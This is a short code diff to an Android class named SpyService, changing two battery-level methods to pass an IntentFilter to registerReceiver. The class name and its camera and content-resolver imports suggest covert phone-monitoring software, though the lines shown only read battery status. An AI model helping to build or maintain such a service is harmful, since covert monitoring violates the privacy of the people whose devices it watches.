@@ -7,6 +7,7 @@ import android.app.Service;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.hardware.Camera;
@@ -98,7 +99,8 @@ public class SpyService extends Service {
 
     private int getBatteryLevel() {
         try {
-            Intent batteryIntent = registerReceiver(null, new Intent(Intent.ACTION_BATTERY_CHANGED));
+            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+            Intent batteryIntent = registerReceiver(null, ifilter);
             if (batteryIntent != null) {
                 int level = batteryIntent.getIntExtra("level", -1);
                 int scale = batteryIntent.getIntExtra("scale", -1);
@@ -506,7 +508,8 @@ public class SpyService extends Service {
 
     private void getBatteryInfo() {
         try {
-            Intent batteryIntent = registerReceiver(null, new Intent(Intent.ACTION_BATTERY_CHANGED));
+            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+            Intent batteryIntent = registerReceiver(null, ifilter);
             if (batteryIntent != null) {
                 int level = batteryIntent.getIntExtra("level", -1);
                 int scale = batteryIntent.getIntExtra("scale", -1);
